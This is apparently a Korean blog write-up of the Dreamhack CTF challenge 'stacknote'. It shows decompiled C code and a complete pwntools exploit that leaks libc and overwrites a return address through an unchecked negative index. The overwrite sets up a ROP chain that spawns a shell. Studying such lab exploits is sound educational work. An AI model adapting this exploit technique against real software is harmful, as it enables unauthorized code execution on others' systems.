---
title: Dreamhack - stacknote
date: 2026-01-10 15:57:46 +0900
categories: [pwn]
---

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-1F4h] BYREF
  char v5[488]; // [rsp+10h] [rbp-1F0h] BYREF
  unsigned __int64 cnry; // [rsp+1F8h] [rbp-8h]

  cnry = __readfsqword(0x28u);
  memset(v5, 0, 0x1E0uLL);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1. create");
      puts("2. read");
      puts("3. update");
      puts("4. delete");
      printf("> ");
      __isoc99_scanf("%d", &v4);
      if ( v4 != 4 )
        break;
      delete_note(v5);
    }
    if ( v4 > 4 )
      break;
    switch ( v4 )
    {
      case 3:
        update_note(v5);
        break;
      case 1:
        create_note(v5);
        break;
      case 2:
        read_note(v5);
        break;
      default:
        return 0;
    }
  }
  return 0;
}
```

```c
int __fastcall create_note(char *a1)
{
  __int64 i; // [rsp+18h] [rbp-8h]

  for ( i = 0LL; ; ++i )
  {
    if ( i > 9 )
      return puts("no empty note");
    if ( !*(_QWORD *)&a1[48 * i] )
      break;
  }
  printf("size: ");
  __isoc99_scanf("%ld", &a1[48 * i]);
  while ( getchar() != '\n' )
    ;
  if ( *(_QWORD *)&a1[48 * i] > 40uLL )
    return puts("size too big");
  printf("data: ");
  return read(0, &a1[48 * i + 8], *(_QWORD *)&a1[48 * i]);
}

unsigned __int64 __fastcall read_note(char *a1)
{
  __int64 v2; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("index: ");
  __isoc99_scanf("%ld", &v2);
  while ( getchar() != 10 )
    ;
  if ( v2 <= 9 && *(_QWORD *)&a1[48 * v2] )
    write(1, &a1[48 * v2 + 8], *(_QWORD *)&a1[48 * v2]);
  else
    puts("invalid index");
  return v3 - __readfsqword(0x28u);
}

unsigned __int64 __fastcall update_note(char *a1)
{
  __int64 v2; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("index: ");
  __isoc99_scanf("%ld", &v2);
  if ( v2 <= 9 && *(_QWORD *)&a1[48 * v2] )
  {
    printf("size: ");
    __isoc99_scanf("%ld", &a1[48 * v2]);
    if ( *(_QWORD *)&a1[48 * v2] <= 0x28uLL )
    {
      printf("data: ");
      read(0, &a1[48 * v2 + 8], *(_QWORD *)&a1[48 * v2]);
    }
    else
    {
      puts("size too big");
    }
  }
  else
  {
    puts("invalid index");
  }
  return v3 - __readfsqword(0x28u);
}

unsigned __int64 __fastcall delete_note(char *a1)
{
  __int64 v2; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("index: ");
  __isoc99_scanf("%ld", &v2);
  while ( getchar() != 10 )
    ;
  if ( v2 <= 9 && *(_QWORD *)&a1[48 * v2] )
    *(_QWORD *)&a1[48 * v2] = 0LL;
  else
    puts("invalid index");
  return v3 - __readfsqword(0x28u);
}
```

488 크기의 버퍼를 선언해두고 사용한다.

create_note

48바이트 단위로 총 10번 입력을 할 수 있다. (48 * 10= 480)

처음 8바이트는 데이터의 크기를 나타낸다. 나머지 40바이트는 size를 입력받아서 정할 수 있는데 40 이 최대이다. 

read_note

값을 입력받고 이를 오프셋으로 사용해 주소가 비어있지 않고 인덱스가 9보다 같거나 작으면 내용을 출력해준다. 인덱스가 음수인지는 검사하지 않는다. 

update_note

read_note와 같은 조건에서 내용을 새롭게 입력할 수 있다. 인덱스가 음수인지 검사하지 않는다. 또한 기존의 size를 원하는 크기로 조작할 수 있다.

delete_note 

위와 같은 조건에서 그 위치의 값을 0으로 만든다. 인덱스가 음수인지 검사하지 않는다.

```python
from pwn import *
import sys

e = ELF("./prob")
libc = ELF("./libc.so.6")

context.binary = e

if len(sys.argv) == 3 : 
    p = remote(sys.argv[1], sys.argv[2])

else :
    p = process([e.path])
    gdb.attach(p)

def create_note():
    p.sendlineafter(b"> ",b'1')
    p.sendlineafter(b"size: ",b'40')
    p.sendafter(b"data: ",b'a'*40)
    

# pause()

for _ in range(10):
    create_note()

p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'index: ',b'9')
p.sendlineafter(b'size: ',b'100')

p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'index: ',b'9')

p.recvn(64)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

libc_base = leak - 0x2a1ca
pop_rdi = libc_base + 0x000000000010f75b
ret = libc_base + 0x000000000002882f
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b"/bin/sh"))

info(f"libc base : {libc_base:#x}")
info(f"ret : {ret:#x}")
info(f"system: {system:#x}")

payload = p64(0) * 2 # 16
payload += p64(pop_rdi) # 24
payload += p64(binsh) # 32
payload += p64(system + 0x1b) # 40 

pause()

p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'index: ',b'-2')
p.sendlineafter(b'size: ',b'40')
p.sendlineafter(b'data: ',payload)

p.interactive()
```

노트를 10번 만든 후, 마지막 노트에 접근해서 size를 크게주면 값을 입력하지는 못하지만 size를 변경할 수 있다.

이 상태에서 읽기 옵션에서 마지막 노트에 접근하면 libc 영역 주소, 코드 영역 주소 카나리를 릭할 수 있다.,

update_note에서 인덱스가 음수인지 검사하지 않기 때문에 OOB가 가능하다. 하지만 데이터를 쓸 경우에는 위와 다르게 size가 최대 40바이트 밖에 안된다. 이 크기로는 main의 ret을 덮을 수 없다. 하지만 -2 인덱스를 줄 경우 rsp와 note-(48*2)가 근접하기 때문에 read의 ret을 덮을 수 있다.

처음 부분에 더미 값을 넣어줘야 하기 때문에 우리가 ret부터 24바이트를 덮을 수 있다. 

해당 시점에서 조건을 만족하는 원샷 가젯이 없기에

그냥 pop rdi + binsh + system 을 하려 했으나 스택 정렬이 깨져서 터진다.

ret을 넣으면 해결되나, 24바이트를 넘어가게 된다.

![1](/assets/img/2026/dh-stacknote/1.png)

system 함수의 어셈블리는 위와 같은데, 우리가 pop rdi binsh system에서 접근하게 되면 system+9 jmp 로 do_system을 하게 된다. jmp는 바로 그 주소로 점프하기 때문에 스택을 건드리지 않지만, system + 27 call do_system은 call이기 때문에 반환주소를 스택에 넣고 do_system으로 넘어가게 된다. 따라서 ROP 체인에 ret을 넣은 것과 같은 효과를 발휘한다.